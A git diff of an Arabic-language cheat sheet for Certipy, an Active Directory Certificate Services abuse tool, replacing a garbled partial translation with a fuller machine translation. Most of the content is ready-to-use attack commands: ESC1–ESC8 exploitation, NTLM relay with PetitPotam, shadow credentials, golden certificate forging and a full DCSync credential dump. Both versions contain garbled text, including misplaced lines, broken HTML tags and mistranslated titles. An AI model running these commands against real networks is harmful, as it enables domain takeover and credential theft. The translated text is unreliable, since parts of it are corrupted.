@@ -1,12 +1,16 @@
-# 🏛️ Certipy — ورقة مرجعية شاملة
-
 <!-- language-home-navigation -->
 [🏠 الصفحة الرئيسية العربية](../../README.ar.md) • [🌐 Languages](../../README.md#-available-languages)
 
-[🇹🇷 Türkçe Sürüm](README.tr.md) • [🇬🇷 Ελληνικά](README.el.md)
+[🇹🇷 Türkçe](README.tr.md) • [🇩🇪 Deutsch](README.de.md) • [🇪🇸 Español](README.es.md) • [🇫🇷 Français](README.fr.md)
+
+[🇮🇹 Italiano](README.it.md) • [🇵🇹 Português](README.pt.md) • [🇷🇺 Русский](README.ru.md) • [🇨🇳 简体中文](README.zh-CN.md) • [🇬🇷 Ελληνικά](README.el.md) • [🇳🇴 Norsk](README.nb.md) • [🇬🇧 English](../README.md)
+
+---
 
 
+# 🏛️ شهادة - ورقة غش كاملة
 
+[🇹🇷 Türkçe Sürüm](translations/README.tr.md)
 ```
    ██████╗███████╗██████╗ ████████╗██╗██████╗ ██╗   ██╗
   ██╔════╝██╔════╝██╔══██╗╚══██╔══╝██║██╔══██╗╚██╗ ██╔╝
@@ -16,106 +20,98 @@
    ╚═════╝╚══════╝╚═╝  ╚═╝   ╚═╝   ╚═╝╚═╝        ╚═╝   
        Active Directory Certificate Services (AD CS) Abuse
 ```
-
 <p align="center">
   <img src="https://img.shields.io/badge/Certipy-AD_CS_Abuse-blue?style=for-the-badge" alt="Certipy">
   <img src="https://img.shields.io/badge/ESC1_to_ESC15-Vulnerabilities-red?style=for-the-badge" alt="ESC1-ESC15">
   <img src="https://img.shields.io/badge/PKINIT-Kerberos_Auth-orange?style=for-the-badge" alt="PKINIT">
   <img src="https://img.shields.io/badge/Active_Directory-Privilege_Escalation-green?style=for-the-badge" alt="AD PrivEsc">
-</p>
+</ص>
 
 <p align="center">
-  <b>🔑 Comprehensive tool for enumerating and exploiting Active Directory Certificate Services (AD CS) misconfigurations</b>
-</p>
+  <b>🔑 أداة شاملة لتعداد واستغلال التكوينات الخاطئة لخدمات شهادات Active Directory (AD CS)</b>
+</ص>
 
 ---
 
 ## 📋 جدول المحتويات
 
-- [مقدمة](#-introduction)
-- [Why AD CS Abuse?](#-why-ad-cs-abuse)
-- [التثبيت](#-installation)
-- [مقدمة](#-certipy-subcommands-overview)
-- [Enumeration & Discovery (`find`)](#-enumeration--discovery-find)
-- [The ESC Vulnerability Matrix](#-the-esc-vulnerability-matrix)
-  - [ESC1: Enrollee Supplies Subject Alt Name (SAN)](#esc1-enrollee-supplies-subject-alt-name-san)
-  - [Exploitation:](#esc2-any-purpose-eku-or-subca)
-  - [ESC3: Certificate Request Agent](#esc3-certificate-request-agent)
-  - [ESC4: Vulnerable Template Access Control (ACL)](#esc4-vulnerable-template-access-control-acl)
-  - [ESC6: EDITF_ATTRIBUTESUBJECTALTNAME2 Enabled](#esc6-editf_attributesubjectaltname2-enabled)
-  - [ESC7: Vulnerable CA Access Control](#esc7-vulnerable-ca-access-control)
+- [المقدمة](#-المقدمة)
+- [لماذا إساءة استخدام AD CS؟](#-why-ad-cs-abuse)
+- [التثبيت](#-التثبيت)
+- [نظرة عامة على الأوامر الفرعية للشهادة](#-نظرة عامة على الأوامر الفرعية للشهادة)
+- [التعداد والاكتشاف (`find`)](#-التعداد--الاكتشاف-البحث)
+- [مصفوفة الضعف ESC](#-مصفوفة الضعف-esc)
+  - [ESC1: الاسم البديل لموضوع مستلزمات المسجل (SAN)](#esc1-enrollee-supplies-subject-alt-name-san)
+  - [ESC2: EKU أو SubCA لأي غرض](#esc2-any- Purpose-eku-or-subca)
+  - [ESC3: وكيل طلب الشهادة](#esc3-certificate-request-agent)
+  - [ESC4: التحكم في الوصول إلى القالب الضعيف (ACL)](#esc4-vulnerable-template-access-control-acl)
+  - [ESC6: تم تمكين EDITF_ATTRIBUTESUBJECTALTNAME2](#esc6-editf_attributesubjectaltname2-enabled)
+  - [ESC7: التحكم في الوصول إلى CA الضعيف](#esc7-vulnerable-ca-access-control)
   - [ESC8: NTLM Relay to HTTP Web Enrollment](#esc8-ntlm-relay-to-http-web-enrollment)
-  - [ESC9 & ESC10: Strong Certificate Mapping Flaws](#esc9--esc10-strong-certificate-mapping-flaws)
-- [Shadow Credentials (`shadow`)](#-shadow-credentials-shadow)
-- [Golden Certificates (`forge`)](#-golden-certificates-forge)
-- [Authenticating with PFX (`auth`)](#-authenticating-with-pfx-auth)
-- [Real-World Attack Workflows](#-real-world-attack-workflows)
-- [مرجع سريع](#-quick-reference-table)
-- [نصائح وأفضل الممارسات](#-tips--best-practices)
-- [Legal Disclaimer](#-legal-disclaimer)
-- [المصادر والمراجع](#-resources)
+  - [ESC9 وESC10: عيوب قوية في تعيين الشهادات](#esc9--esc10-strong-certificate-mapping-flaws)
+- [بيانات اعتماد الظل (`shadow`)](#-أوراق اعتماد الظل-الظل)
+- [الشهادات الذهبية (`forge`)](#-الشهادات الذهبية-تزوير)
+- [المصادقة باستخدام PFX (`auth`)](#-authenticating-with-pfx-auth)
+- [سير عمل الهجوم في العالم الحقيقي](#-سير عمل الهجوم في العالم الحقيقي)
+- [الجدول المرجعي السريع](#-الجدول المرجعي السريع)
+- [النصائح وأفضل الممارسات](#-نصائح--أفضل-الممارسات)
+- [إخلاء المسؤولية القانونية](#-إخلاء المسؤولية القانونية)
+- [الموارد](#-الموارد)
 
 ---
 
-## 🎯 مقدمة
+## 🎯 المقدمة
 
-**Certipy** (created by Oliver Lyak) is the premier Python-based tool for enumerating and exploiting Active Directory Certificate Services (**AD CS**). AD CS is Microsoft’s Public Key Infrastructure (PKI) implementation for enterprise Active Directory networks, widely used for smart card logon, VPNs, S/MIME, and internal TLS encryption.
+**Certipy** (التي أنشأها Oliver Lyak) هي الأداة الرائدة المستندة إلى Python لتعداد واستغلال خدمات شهادات Active Directory (**AD CS**). AD CS هو تطبيق Microsoft للبنية التحتية للمفتاح العام (PKI) لشبكات Active Directory الخاصة بالمؤسسات، ويستخدم على نطاق واسع لتسجيل الدخول بالبطاقة الذكية، وشبكات VPN، وS/MIME، وتشفير TLS الداخلي.
 
-Because certificate misconfigurations frequently allow unprivileged domain users to request certificates as Domain Admins or Domain Controllers, AD CS abuse represents one of the most reliable and impactful domain escalation vectors in modern enterprise penetration tests.
+نظرًا لأن التكوينات الخاطئة للشهادة تسمح في كثير من الأحيان لمستخدمي المجال غير المميزين بطلب الشهادات كمسؤولي المجال أو وحدات التحكم بالمجال، فإن إساءة استخدام AD CS تمثل أحد أكثر ناقلات تصعيد المجال موثوقية وتأثيرًا في اختبارات اختراق المؤسسات الحديثة.
 
 ---
 
-## ⚖️ Why AD CS Abuse?
+## ⚖️ لماذا إساءة استخدام AD CS؟
 
-- ⚡ **Instant Domain Escalation:** Misconfigured certificate templates often grant domain-wide compromise in seconds.
-- 🔑 **Stealthy & Persistent:** Stolen certificates or forged Golden Certificates can remain valid for years without triggering standard password change alerts.
-- 🔄 **PKINIT to NT Hash:** Certipy authenticates requested `.pfx` certificates over Kerberos PKINIT, retrieving the target's plaintext NT hash directly from the KDC.
+- ⚡ **التصعيد الفوري للنطاق:** غالبًا ما تمنح قوالب الشهادات التي تم تكوينها بشكل خاطئ تسوية على مستوى النطاق في ثوانٍ.
+- 🔑 **متخفية ومستمرة:** يمكن أن تظل الشهادات المسروقة أو الشهادات الذهبية المزورة صالحة لسنوات دون تشغيل تنبيهات تغيير كلمة المرور القياسية.
+- 🔄 **PKINIT إلى NT Hash:** يقوم Certipy بمصادقة شهادات `.pfx` المطلوبة عبر Kerberos PKINIT، واسترداد تجزئة النص العادي للهدف مباشرة من KDC.
 
 ---
 
 ## 📥 التثبيت
 
-### |**Bug Fixes & Modules**|Frozen|Constantly updated CVE and exploit modules|
-
+### استخدام pipx (مستحسن)
 ```bash
 pipx install certipy-ad
 ```
-
-### 📥 التثبيت
-
+### من مستودع جيثب
 ```bash
 git clone https://github.com/ly4k/Certipy.git
 cd Certipy
 pip install .
 ```
-
-### Verification
-
+### تَحَقّق
 ```bash
 certipy -h
 ```
-
 ---
 
-## 🧭 مقدمة
+## 🧭 نظرة عامة على أوامر الشهادة الفرعية
 
-|Subcommand|الغرض|
+| أمر فرعي | وظيفة |
 |------------|----------|
-|`find`|Enumerate CAs, templates, and detect ESC vulnerabilities|
-|`req`|Request certificates from vulnerable templates|
-|`auth`|Authenticate using `.pfx` certificates to retrieve TGT and NT hash|
-|`ca`|Enumerate and modify CA configuration settings|
-|`template`|Modify certificate template settings (useful in ESC4)|
-|`account`|Manage Active Directory computer accounts (MachineAccountQuota)|
-|`shadow`|Exploit Shadow Credentials (`msDS-KeyCredentialLink`)|
-|`forge`|Forge Golden Certificates using a stolen CA private key|
+| `find` | تعداد المراجع المصدقة والقوالب واكتشاف ثغرات ESC |
+| `req` | طلب شهادات من القوالب الضعيفة |
+| `auth` | قم بالمصادقة باستخدام شهادات `.pfx` لاسترداد تجزئة TGT وNT |
+| `ca` | تعداد وتعديل إعدادات تكوين CA |
+| `template` | تعديل إعدادات قالب الشهادة (مفيدة في ESC4) |
+| `account` | إدارة حسابات كمبيوتر Active Directory (MachineAccountQuota) |
+| `shadow` | استغلال بيانات اعتماد الظل (`msDS-KeyCredentialLink`) |
+| `forge` | تزوير الشهادات الذهبية باستخدام مفتاح CA الخاص المسروق |
 
 ---
 
-## 🔍 Enumeration & Discovery (`find`)
+## 🔍 التعداد والاكتشاف (`find`)
 
-|`forge`|Forge Golden Certificates using a stolen CA private key|
-
+ابدأ بتحديد مرجع تصديق المؤسسة (CA) والمسح بحثًا عن القوالب المعرضة للخطر:
 ```bash
 # Enumerate all CAs and templates with standard credentials
 certipy find -u 'john.doe@corp.local' -p 'P@ssword123' -dc-ip 10.10.10.1
@@ -126,18 +122,17 @@ certipy find -u 'john.doe@corp.local' -p 'P@ssword123' -dc-ip 10.10.10.1 -vulner
 # Output results formatted for BloodHound
 certipy find -u 'john.doe@corp.local' -p 'P@ssword123' -dc-ip 10.10.10.1 -bloodhound
 ```
-
 ---
 
-## 💥 The ESC Vulnerability Matrix
+## 💥 مصفوفة الضعف ESC
 
-### ESC1: Enrollee Supplies Subject Alt Name (SAN)
+### ESC1: الاسم البديل للموضوع (SAN) لمستلزمات المسجل
 
-**Condition:**
-- Low-privileged users have enrollment rights (`Client Authentication` EKU enabled).
-- Template specifies `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` (allows requester to specify any Subject Alternative Name, such as the Domain Administrator).
+**الحالة:**
+- يتمتع المستخدمون ذوو الامتيازات المنخفضة بحقوق التسجيل (تم تمكين `Client Authentication` EKU).
+- يحدد القالب `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` (يسمح للطالب بتحديد أي اسم بديل للموضوع، مثل مسؤول المجال).
 
-**Exploitation:**
+**استغلال:**
 ```bash
 # 1. Request certificate on behalf of Domain Administrator
 certipy req -u 'john.doe@corp.local' -p 'P@ssword123' \
@@ -149,28 +144,28 @@ certipy req -u 'john.doe@corp.local' -p 'P@ssword123' \
 # 2. Authenticate with resulting administrator.pfx via PKINIT
 certipy auth -pfx administrator.pfx -dc-ip 10.10.10.1
 ```
-*Output yields Administrator's TGT and plaintext NT Hash!*
+*ينتج عن الإخراج TGT الخاص بالمسؤول والنص العادي NT Hash!*
 
 ---
 
-### Exploitation:
+### ESC2: EKU أو SubCA لأي غرض
 
-**Condition:**
-- Template specifies `Any Purpose` EKU or has no EKU defined.
-- Can be used for any purpose, including client authentication.
+**الحالة:**
+- يحدد القالب `Any Purpose` EKU أو لا يحتوي على EKU محدد.
+- يمكن استخدامها لأي غرض، بما في ذلك مصادقة العميل.
 
-**Exploitation:**
-Exploited identically to ESC1 or used in combination with ESC3 to obtain an enrollment agent certificate.
+**الاستغلال:**
+يتم استغلاله بشكل مماثل لـ ESC1 أو يتم استخدامه مع ESC3 للحصول على شهادة وكيل التسجيل.
 
 ---
 
-### ESC3: Certificate Request Agent
+### ESC3: وكيل طلب الشهادة
 
-**Condition:**
-- Template has the `Certificate Request Agent` EKU (Enrollment Agent).
-- Allows requesting certificates on behalf of another user across secondary templates.
+**الحالة:**
+- يحتوي القالب على `Certificate Request Agent` EKU (وكيل التسجيل).
+- يسمح بطلب الشهادات نيابة عن مستخدم آخر عبر القوالب الثانوية.
 
-**Exploitation:**
+**استغلال:**
 ```bash
 # 1. Request Enrollment Agent certificate
 certipy req -u 'john.doe@corp.local' -p 'P@ssword123' \
@@ -187,15 +182,14 @@ certipy req -u 'john.doe@corp.local' -p 'P@ssword123' \
 # 3. Authenticate with the obtained Administrator PFX
 certipy auth -pfx administrator.pfx -dc-ip 10.10.10.1
 ```
-
 ---
 
-### ESC4: Vulnerable Template Access Control (ACL)
+### ESC4: التحكم في الوصول إلى القالب الضعيف (ACL)
 
-**Condition:**
-- Low-privilege user has `WriteOwner`, `WriteDacl`, or `WriteProperty` rights over a certificate template.
+**الحالة:**
+- يتمتع المستخدم ذو الامتيازات المنخفضة بحقوق `WriteOwner` أو `WriteDacl` أو `WriteProperty` في قالب الشهادة.
 
-**Exploitation:**
+**استغلال:**
 ```bash
 # 1. Overwrite template configuration to make it vulnerable to ESC1
 certipy template -u 'john.doe@corp.local' -p 'P@ssword123' \
@@ -214,15 +208,14 @@ certipy template -u 'john.doe@corp.local' -p 'P@ssword123' \
   -template 'TargetTemplate' \
   -configuration TargetTemplate.json -dc-ip 10.10.10.1
 ```
-
 ---
 
-### ESC6: EDITF_ATTRIBUTESUBJECTALTNAME2 Enabled
+### ESC6: تم تمكين EDITF_ATTRIBUTESUBJECTALTNAME2
 
-**Condition:**
-- The CA has the `EDITF_ATTRIBUTESUBJECTALTNAME2` flag set, allowing any certificate request to specify arbitrary SANs regardless of template settings!
+**الحالة:**
+- يحتوي CA على مجموعة علامات `EDITF_ATTRIBUTESUBJECTALTNAME2`، مما يسمح لأي طلب شهادة بتحديد شبكات SAN عشوائية بغض النظر عن إعدادات القالب!
 
-**Exploitation:**
+**استغلال:**
 ```bash
 # Request certificate as Administrator using any template allowing Client Auth (e.g. default 'User')
 certipy req -u 'john.doe@corp.local' -p 'P@ssword123' \
@@ -230,15 +223,14 @@ certipy req -u 'john.doe@corp.local' -p 'P@ssword123' \
   -template 'User' \
   -upn 'administrator@corp.local' -dc-ip 10.10.10.1
 ```
-
 ---
 
-### ESC7: Vulnerable CA Access Control
+### ESC7: التحكم في الوصول إلى CA الضعيف
 
-**Condition:**
-- User has `ManageCA` or `ManageCertificates` rights on the CA itself.
+**الحالة:**
+- يتمتع المستخدم بحقوق `ManageCA` أو `ManageCertificates` على المرجع المصدق (CA) نفسه.
 
-**Exploitation:**
+**استغلال:**
 ```bash
 # 1. Add yourself as Officer on the CA
 certipy ca -u 'john.doe@corp.local' -p 'P@ssword123' \
@@ -255,49 +247,45 @@ certipy ca -u 'john.doe@corp.local' -p 'P@ssword123' \
   -ca 'CORP-CA' \
   -issue-request <REQUEST_ID> -dc-ip 10.10.10.1
 ```
-
 ---
 
-### ESC8: NTLM Relay to HTTP Web Enrollment
+### ESC8: ترحيل NTLM إلى تسجيل ويب HTTP
 
-**Condition:**
-- The CA has the Web Enrollment HTTP endpoint (`/certsrv/`) enabled with NTLM authentication without EPA (Extended Protection for Authentication) and HTTPS.
+**الحالة:**
+- يتمتع المرجع المصدق (CA) بنقطة نهاية HTTP لتسجيل الويب (`/certsrv/`) التي تم تمكينها مع مصادقة NTLM بدون EPA (الحماية الموسعة للمصادقة) وHTTPS.
 
-**Exploitation Workflow:**
-ESC8: NTLM Relay to HTTP Web Enrollment
+** سير عمل الاستغلال: **
+1. ابدأ `ntlmrelayx` بالإشارة إلى CA Web Enrollment:
    ```bash
    impacket-ntlmrelayx -t http://10.10.10.50/certsrv/certfnsh.asp -smb2support --adcs --template DomainController
    ```
-Condition:
+2. قم بتشغيل مصادقة الآلة القسرية عبر PetitPotam أو PrinterBug:
    ```bash
    python3 petitpotam.py 192.168.1.100 10.10.10.1
    ```
-3. `ntlmrelayx` relays the DC's machine account NTLM auth, requests a computer certificate, and outputs base64 `.pfx`.
-Exploitation Workflow:
+3. يقوم `ntlmrelayx` بترحيل مصادقة NTLM لحساب جهاز DC، ويطلب شهادة كمبيوتر، ويخرج base64 `.pfx`.
+4. قم بالمصادقة كوحدة تحكم بالمجال باستخدام Certipy:
    ```bash
    certipy auth -pfx dc01.pfx -dc-ip 10.10.10.1
    ```
-5. Use the DC's NT hash to perform a full DCSync dump with `impacket-secretsdump`.
+5. استخدم تجزئة NT الخاص بـ DC لإجراء تفريغ DCSync كامل باستخدام `impacket-secretsdump`.
 
 ---
 
-## 👥 Shadow Credentials (`shadow`)
+## 👥 بيانات اعتماد الظل (`shadow`)
 
-5. Use the DC's NT hash to perform a full DCSync dump with `impacket-secretsdump`.
-
+إذا كان الحساب المخترق لديه حق الوصول للكتابة عبر سمة `msDS-KeyCredentialLink` الخاصة بحساب آخر:
 ```bash
 # Automatically write key credential, authenticate via PKINIT, and recover target NT hash
 certipy shadow auto -u 'john.doe@corp.local' -p 'P@ssword123' \
   -account 'TARGET_USER' \
   -dc-ip 10.10.10.1
 ```
-
 ---
 
-## 👑 Golden Certificates (`forge`)
+## 👑 الشهادات الذهبية (`forge`)
 
-If you have compromised the CA and extracted its private key:
-
+إذا قمت باختراق CA واستخرجت مفتاحه الخاص:
 ```bash
 # Forge a Golden Certificate valid for any user without contacting the CA
 certipy forge -ca-pfx ca_private.pfx \
@@ -307,11 +295,9 @@ certipy forge -ca-pfx ca_private.pfx \
 # Authenticate with the forged certificate
 certipy auth -pfx administrator_forged.pfx -dc-ip 10.10.10.1
 ```
-
 ---
 
-## 🔑 Authenticating with PFX (`auth`)
-
+## 🔑 المصادقة باستخدام PFX (`auth`)
 ```bash
 # Retrieve TGT and NT hash via PKINIT
 certipy auth -pfx administrator.pfx -dc-ip 10.10.10.1
@@ -319,13 +305,11 @@ certipy auth -pfx administrator.pfx -dc-ip 10.10.10.1
 # Save TGT to ccache for Kerberos ticketing
 certipy auth -pfx administrator.pfx -dc-ip 10.10.10.1 -ldap-shell
 ```
-
 ---
 
-## 🎬 Real-World Attack Workflows
+## 🎬 سير عمل الهجوم الواقعي
 
-### Complete ESC1 Domain Takeover in 3 Commands
-
+### أكمل عملية الاستيلاء على مجال ESC1 في 3 أوامر
 ```bash
 # Step 1: Discover ESC1 template
 certipy find -u 'alice@domain.local' -p 'Summer2026!' -dc-ip 10.10.10.1 -vulnerable -stdout
@@ -343,47 +327,46 @@ certipy auth -pfx administrator.pfx -dc-ip 10.10.10.1
 # Step 4: Full DCSync dump
 impacket-secretsdump -hashes :<EXTRACTED_NT_HASH> 'domain.local/administrator@10.10.10.1'
 ```
-
 ---
 
-## 📊 مرجع سريع
+## 📊 جدول مرجعي سريع
 
-|Task|الأمر|
+| مهمة | الأمر |
 |------|---------|
-|**Enumerate AD CS**|`certipy find -u u@d -p p -dc-ip <IP> -vulnerable -stdout`|
-|**Request Cert (ESC1)**|`certipy req -u u@d -p p -ca <CA> -template <T> -upn admin@d -dc-ip <IP>`|
-|**Authenticate PFX**|`certipy auth -pfx <file>.pfx -dc-ip <IP>`|
-|**Modify Template (ESC4)**|`certipy template -u u@d -p p -template <T> -save-old -dc-ip <IP>`|
-|**Shadow Credentials**|`certipy shadow auto -u u@d -p p -account <TARGET> -dc-ip <IP>`|
-|**Manage CA Rights**|`certipy ca -u u@d -p p -ca <CA> -add-officer <u> -dc-ip <IP>`|
-|**Forge Golden Cert**|`certipy forge -ca-pfx ca.pfx -upn admin@d -subject <DN>`|
+| **تعداد AD CS** | `certipy find -u u@d -p p -dc-ip <IP> -vulnerable -stdout` |
+| **طلب الشهادة (ESC1)** | `certipy req -u u@d -p p -ca <CA> -template <T> -upn admin@d -dc-ip <IP>` |
+| **مصادقة PFX** | `certipy auth -pfx <file>.pfx -dc-ip <IP>` |
+| **تعديل القالب (ESC4)**| `certipy template -u u@d -p p -template <T> -save-old -dc-ip <IP>` |
+| ** بيانات اعتماد الظل ** | `certipy shadow auto -u u@d -p p -account <TARGET> -dc-ip <IP>` |
+| **إدارة حقوق CA** | `certipy ca -u u@d -p p -ca <CA> -add-officer <u> -dc-ip <IP>` |
+| **تزوير الشهادة الذهبية** | `certipy forge -ca-pfx ca.pfx -upn admin@d -subject <DN>` |
 
 ---
 
-## 💡 نصائح وأفضل الممارسات
+## 💡 النصائح وأفضل الممارسات
 
-1. **Check DC Clock Sync:**
-   Kerberos PKINIT requires your system time to be synchronized within 5 minutes of the Domain Controller. Run:
+1. **تحقق من مزامنة ساعة DC:**
+   يتطلب Kerberos PKINIT مزامنة وقت النظام الخاص بك خلال 5 دقائق من وحدة تحكم المجال. يجري:
    ```bash
    sudo rdate -n 10.10.10.1
    # or
    sudo ntpdate 10.10.10.1
    ```
-2. **Handle KDC_ERR_PADATA_TYPE_NOSUPP:**
-   If `certipy auth` fails with this error, the Domain Controller does not have a valid Domain Controller certificate installed for PKINIT. In this case, use LDAP or SChannel authentication.
-3. **Always Clean Up ESC4 Templates:**
-   When altering certificate templates, always retain and re-apply the backup configuration (`-configuration <FILE>.json`) to avoid leaving the environment vulnerable or causing operational outages.
+2. **التعامل مع KDC_ERR_PADATA_TYPE_NOSUPP:**
+   إذا فشل `certipy auth` بسبب هذا الخطأ، فهذا يعني أن وحدة تحكم المجال ليس لديها شهادة وحدة تحكم مجال صالحة مثبتة لـ PKINIT. في هذه الحالة، استخدم مصادقة LDAP أو SChannel.
+3. **قم دائمًا بتنظيف قوالب ESC4:**
+   عند تغيير قوالب الشهادات، احتفظ دائمًا بتكوين النسخ الاحتياطي وأعد تطبيقه (`-configuration <FILE>.json`) لتجنب ترك البيئة معرضة للخطر أو التسبب في انقطاع التشغيل.
 
 ---
 
-## ⚠️ Legal Disclaimer
+## ⚠️إخلاء المسؤولية القانونية
 
-> **IMPORTANT:** Active Directory Certificate Services attacks grant critical, high-impact administrative access across domain networks. Certipy must only be executed during authorized penetration tests, red team exercises, and ethical security audits with written permission.
+> **هام:** تمنح هجمات خدمات شهادات Active Directory وصولاً إداريًا حاسمًا وعالي التأثير عبر شبكات المجال. يجب تنفيذ Certipy فقط أثناء اختبارات الاختراق المصرح بها، وتمارين الفريق الأحمر، وعمليات تدقيق الأمان الأخلاقي بإذن كتابي.
 
 ---
 
-## 📚 المصادر والمراجع
+## 📚 المصادر
 
-- [Certipy Official GitHub Repository](https://github.com/ly4k/Certipy)
-- [Certified Pre-Owned Whitepaper (SpecterOps)](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf)
-- [AD CS Attack Paths & Protections (Oliver Lyak)](https://posts.specterops.io/certified-pre-owned-d95910965cd2)
+- [مستودع شهادة GitHub الرسمي](https://github.com/ly4k/Certipy)
+- [الورقة البيضاء المعتمدة للسيارات المستعملة (SpecterOps)](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf)
+- [مسارات هجوم AD CS وعمليات الحماية (أوليفر لياك)](https://posts.specterops.io/certified-pre-OWN-d95910965cd2)
